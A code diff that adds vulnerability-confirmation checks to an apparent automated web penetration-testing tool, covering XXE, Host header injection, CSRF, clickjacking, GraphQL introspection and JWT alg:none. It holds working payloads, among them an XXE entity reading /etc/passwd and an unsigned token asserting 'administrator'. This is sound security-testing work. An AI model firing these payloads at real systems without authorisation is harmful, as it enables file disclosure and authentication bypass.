@@ -2,6 +2,8 @@
 by hypothesis class without a hardcoded branch (Open/Closed)."""
 from __future__ import annotations
 
+import base64
+import json
 import re
 import secrets
 from dataclasses import dataclass, field
@@ -434,4 +436,154 @@ def check_cors(session, hyp, ev_dir, ctx):
         return CheckResult("false-positive", endpoint, files=files,
                            false_positive_reason=f"Access-Control-Allow-Origin is fixed "
                                                  f"({acao}), not reflected")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+_XXE_DOC = ('<?xml version="1.0"?>\n'
+            '<!DOCTYPE root [<!ENTITY {ent} SYSTEM "file:///etc/passwd">]>\n'
+            '<root>&{ent};</root>')
+
+
+@register("XXE")
+def check_xxe(session, hyp, ev_dir, ctx):
+    """XML external entity injection: a parser resolves an external SYSTEM entity, pulling a
+    local file into the response. Confirm by referencing /etc/passwd; a benign control (same
+    doc, no entity) must not leak it. One read-only file reference is proof."""
+    endpoint = hyp["endpoint"]
+    ent = "hb" + secrets.token_hex(3)
+    headers = {"Content-Type": "application/xml"}
+
+    control = session.post(endpoint, raw="<?xml version=\"1.0\"?><root>ok</root>",
+                           headers=headers)
+    inject = session.post(endpoint, raw=_XXE_DOC.format(ent=ent), headers=headers)
+    files = save_evidence(ev_dir, "control-noentity", control)
+    files += save_evidence(ev_dir, "inject-xxe", inject)
+
+    if _PASSWD.search(inject.body) and not _PASSWD.search(control.body):
+        return CheckResult("confirmed", endpoint, "high",
+                           'SYSTEM "file:///etc/passwd"',
+                           "External entity resolved to /etc/passwd (root:...:0:0: present), "
+                           "absent from the entity-free control.", files=files)
+    if f"&{ent};" in inject.body:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="external entities are not resolved "
+                                                 "(reference returned unexpanded)")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("HOST-HEADER", "HOST_HEADER")
+def check_host_header(session, hyp, ev_dir, ctx):
+    """Host header injection: the app builds an absolute URL (e.g. a password-reset link)
+    from the attacker-controlled Host header. Confirm by sending a marker Host and finding
+    it reflected into the response, where it was not with the real Host."""
+    endpoint = hyp["endpoint"]
+    marker = "evil-" + secrets.token_hex(3) + ".example"
+
+    control = session.get(endpoint)
+    inject = session.get(endpoint, headers={"Host": marker})
+    files = save_evidence(ev_dir, "control-host", control)
+    files += save_evidence(ev_dir, "inject-host", inject)
+
+    if marker in inject.body and marker not in control.body:
+        return CheckResult("confirmed", endpoint, "medium", f"Host: {marker}",
+                           f"The request Host header was reflected into the response "
+                           f"({marker}), so a generated link can be pointed at an attacker "
+                           "host.", files=files)
+    if control.status == 200 and marker not in inject.body:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="response uses a fixed canonical host, not "
+                                                 "the request Host header")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("CSRF")
+def check_csrf(session, hyp, ev_dir, ctx):
+    """CSRF: a state-changing request is accepted with no unpredictable anti-CSRF token, so
+    another site can forge it using the victim's cookies. Confirm by submitting the change
+    without any token; a rejection (token required) is a false positive."""
+    endpoint = hyp["endpoint"]
+    param = hyp.get("parameter") or "email"
+    marker = "hb" + secrets.token_hex(3) + "@evil.example"
+
+    resp = session.post(endpoint, data={param: marker})  # deliberately no CSRF token
+    files = save_evidence(ev_dir, "no-token", resp)
+    body = (resp.body or "").lower()
+
+    if resp.status == 200 and marker in (resp.body or ""):
+        return CheckResult("confirmed", endpoint, "medium", f"POST {param}={marker} (no token)",
+                           "State change was accepted without any anti-CSRF token, so it can "
+                           "be forged cross-site using the victim's session.", files=files)
+    if resp.status in (400, 403) or "csrf" in body or "token" in body:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="request without a CSRF token was rejected "
+                                                 "(anti-CSRF protection present)")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("CLICKJACKING")
+def check_clickjacking(session, hyp, ev_dir, ctx):
+    """Clickjacking: an HTML page served with neither X-Frame-Options nor a CSP
+    frame-ancestors directive can be framed by any site and overlaid for UI redress."""
+    endpoint = hyp["endpoint"]
+    resp = session.get(endpoint)
+    files = save_evidence(ev_dir, "frame-headers", resp)
+    hdrs = {k.lower(): v for k, v in resp.headers.items()}
+    is_html = "html" in hdrs.get("content-type", "").lower()
+    csp = hdrs.get("content-security-policy", "").lower()
+    framed_denied = bool(hdrs.get("x-frame-options")) or "frame-ancestors" in csp
+
+    if resp.status == 200 and is_html and not framed_denied:
+        return CheckResult("confirmed", endpoint, "low", "no X-Frame-Options / frame-ancestors",
+                           "HTML page served without X-Frame-Options or a CSP frame-ancestors "
+                           "directive, so any site can frame it (clickjacking).", files=files)
+    if framed_denied:
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="X-Frame-Options or CSP frame-ancestors is "
+                                                 "set (framing denied)")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+@register("GRAPHQL", "GRAPHQL-INTROSPECTION")
+def check_graphql(session, hyp, ev_dir, ctx):
+    """GraphQL introspection: the endpoint answers an introspection query, disclosing the
+    full schema (types, fields, mutations) to anyone — useful recon for an attacker."""
+    endpoint = hyp["endpoint"]
+    resp = session.post(endpoint, json_body={"query": "{__schema{queryType{name} types{name}}}"})
+    files = save_evidence(ev_dir, "introspection", resp)
+    body = resp.body or ""
+
+    if resp.status == 200 and "__schema" in body:
+        return CheckResult("confirmed", endpoint, "low", "{__schema{types{name}}}",
+                           "GraphQL introspection is enabled; the full schema is disclosed.",
+                           files=files)
+    if "introspection" in body.lower() or resp.status in (400, 403):
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="introspection is disabled or rejected")
+    return CheckResult("unconfirmed", endpoint, files=files)
+
+
+def _jwt_segment(obj):
+    return base64.urlsafe_b64encode(json.dumps(obj).encode()).rstrip(b"=").decode()
+
+
+@register("JWT")
+def check_jwt(session, hyp, ev_dir, ctx):
+    """JWT alg:none: a forged token with header {"alg":"none"} and no signature is accepted,
+    letting an attacker assert any identity. Confirm by claiming 'administrator' with an
+    unsigned token; a rejection is a false positive."""
+    endpoint = hyp["endpoint"]
+    forged = (_jwt_segment({"alg": "none", "typ": "JWT"}) + "." +
+              _jwt_segment({"user": "administrator", "role": "admin"}) + ".")
+    resp = session.get(endpoint, headers={"Authorization": f"Bearer {forged}"})
+    files = save_evidence(ev_dir, "alg-none", resp)
+    body = resp.body or ""
+
+    if resp.status == 200 and "administrator" in body:
+        return CheckResult("confirmed", endpoint, "high", f"Bearer {forged}",
+                           "An unsigned alg:none token asserting 'administrator' was "
+                           "accepted; identity can be forged without the signing key.",
+                           files=files)
+    if resp.status in (401, 403):
+        return CheckResult("false-positive", endpoint, files=files,
+                           false_positive_reason="unsigned (alg:none) token was rejected")
     return CheckResult("unconfirmed", endpoint, files=files)
